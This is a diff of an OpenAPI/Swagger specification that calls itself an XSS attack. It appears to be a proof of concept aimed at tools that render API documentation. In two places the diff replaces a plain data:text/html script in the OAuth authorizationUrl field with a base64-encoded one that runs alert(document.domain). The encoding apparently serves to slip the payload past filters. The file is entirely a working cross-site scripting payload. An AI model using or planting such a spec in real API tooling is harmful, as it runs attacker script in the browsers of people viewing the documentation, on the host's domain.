@@ -7,7 +7,7 @@ components:
         type: oauth2
         flows: 
           implicit: 
-            authorizationUrl: data:text/html,<script>alert(0)</script>
+            authorizationUrl: data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+
             scopes: {}
 security:
   - basicAuth: []
@@ -19,7 +19,7 @@ securityDefinitions:
       type: oauth2
       flows: 
         implicit: 
-          authorizationUrl: data:text/html,<script>alert(0)</script>
+          authorizationUrl: data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+
           scopes: {}
 info:
   title: XSS Attack BY Kharaone
